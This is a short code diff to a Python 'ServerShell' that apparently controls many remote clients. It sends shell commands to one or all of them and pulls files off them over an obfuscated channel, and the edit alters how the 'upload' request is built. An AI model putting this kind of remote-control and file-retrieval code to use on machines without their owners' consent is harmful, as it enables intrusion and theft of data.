@@ -154,7 +154,6 @@ class ServerShell(cmd.Cmd):
         args = args.split(" ")
         if len(args) >= 2:
             cleanedCommand = "cmd " + ' '.join(args[1:])
-            print("## cleanedCommand: " + cleanedCommand)
             
             if args[0] == "all":
                 for client in clients:
@@ -224,7 +223,8 @@ class ServerShell(cmd.Cmd):
 
             client = clients[clientNumber]
 
-            receivedData = EncryptDecryptString(ReceiveDataFromClient(client, ' '.join(args[1:])))
+            receivedData = ReceiveDataFromClient(client, "upload " + ' '.join(args[1:]))
+            receivedData = EncryptDecryptString(receivedData)
             if len(receivedData) > 0:
                 filePathSplitted = args[1].split("\\")
                 fileName = client.info + "_" + filePathSplitted[len(filePathSplitted) - 1]
